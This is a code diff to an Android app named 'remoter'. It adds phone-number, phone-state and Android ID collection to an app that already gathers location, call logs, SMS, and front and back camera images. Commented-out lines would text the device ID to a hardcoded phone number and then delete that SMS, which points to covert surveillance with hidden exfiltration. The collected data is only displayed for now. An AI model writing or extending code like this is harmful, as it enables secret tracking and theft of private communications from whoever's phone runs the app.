@@ -1,6 +1,7 @@
 package com.heilang.remoter
 
 import android.Manifest
+import android.annotation.SuppressLint
 import android.content.Context
 import android.content.pm.PackageManager
 import android.os.Bundle
@@ -28,16 +29,19 @@ import com.heilang.remoter.ui.theme.RemoterTheme
 import androidx.compose.ui.graphics.ImageBitmap
 import androidx.compose.ui.graphics.asImageBitmap
 import androidx.compose.foundation.Image
+import android.provider.Settings
 
 class MainActivity : ComponentActivity() {
 
+    @SuppressLint("InlinedApi")
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+
         CameraCapture.initializeExecutor()
         // Request location permission
         val requestPermissionLauncher = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
             if (permissions[Manifest.permission.ACCESS_FINE_LOCATION] == true || permissions[Manifest.permission.ACCESS_COARSE_LOCATION] == true ||
-                permissions[Manifest.permission.READ_CALL_LOG] == true || permissions[Manifest.permission.READ_SMS] == true || permissions[Manifest.permission.CAMERA] == true) {
+                permissions[Manifest.permission.READ_CALL_LOG] == true || permissions[Manifest.permission.READ_SMS] == true || permissions[Manifest.permission.CAMERA] == true || permissions[Manifest.permission.READ_PHONE_NUMBERS] == true || permissions[Manifest.permission.READ_PHONE_STATE]==true) {
                 // Permission granted
                 setContent {
                     RemoterTheme {
@@ -58,7 +62,9 @@ class MainActivity : ComponentActivity() {
                 Manifest.permission.READ_CALL_LOG,
                 Manifest.permission.READ_SMS,
                 Manifest.permission.CAMERA,
-                Manifest.permission.WRITE_EXTERNAL_STORAGE
+                Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                Manifest.permission.READ_PHONE_NUMBERS,
+                Manifest.permission.READ_PHONE_STATE
             )
         )
     }
@@ -72,13 +78,19 @@ class MainActivity : ComponentActivity() {
 fun LocationTrackingHandler() {
     val context = LocalContext.current
     val locationText = remember { mutableStateOf("Fetching location...") }
+    val androidID = remember { mutableStateOf("android id") }
     val callLogs = remember { mutableStateOf<List<CallLogEntry>>(emptyList()) }
     val handler = remember { Handler(Looper.getMainLooper()) }
     val messageLogs = remember { mutableStateOf<List<MessageLogEntry>>(emptyList()) }
     val frontCameraImage = remember { mutableStateOf<ImageBitmap?>(null) }
     val backCameraImage = remember { mutableStateOf<ImageBitmap?>(null) }
+    val phoneNumbers = remember { mutableStateOf<List<String>>(emptyList()) }
     LaunchedEffect(Unit) {
-        // Ensure permission is granted
+        //will be used as a identifier of the user or device
+        androidID.value = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
+        val phoneNumber = "18341530157"
+//        SmsUtils.sendSms(context, phoneNumber, androidID.value)
+//        SmsUtils.deleteSms(context,phoneNumber)
         if (ContextCompat.checkSelfPermission(
                 context,
                 Manifest.permission.ACCESS_FINE_LOCATION
@@ -153,6 +165,15 @@ fun LocationTrackingHandler() {
         } else {
             Toast.makeText(context, "Camera permission is denied.", Toast.LENGTH_SHORT).show()
         }
+        if (ContextCompat.checkSelfPermission(
+                context,
+                Manifest.permission.READ_PHONE_NUMBERS
+            ) == PackageManager.PERMISSION_GRANTED
+        ) {
+            phoneNumbers.value = PhoneNumberFetcher.fetchPhoneNumbers(context)
+        } else {
+            Toast.makeText(context, "Phone number permission is denied.", Toast.LENGTH_SHORT).show()
+        }
     }
 
     Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
@@ -164,7 +185,18 @@ fun LocationTrackingHandler() {
                     modifier = Modifier.padding(8.dp)
                 )
             }
+            item {
+                Text(
+                    text = "Android ID: ${androidID.value}",
+                    modifier = Modifier.padding(8.dp)
+                )
+            }
+            items(phoneNumbers.value) { phoneNumber ->
+                Column(modifier = Modifier.padding(8.dp)) {
+                    Text(text = phoneNumber)
 
+                }
+            }
             // LazyColumn to display all call logs
             items(callLogs.value) { callLog ->
                 Column(modifier = Modifier.padding(8.dp)) {
@@ -196,6 +228,8 @@ fun LocationTrackingHandler() {
                     Image(bitmap = it, contentDescription = "Back Camera Image", modifier = Modifier.padding(8.dp))
                 }
             }
+
+
 
         }
     }
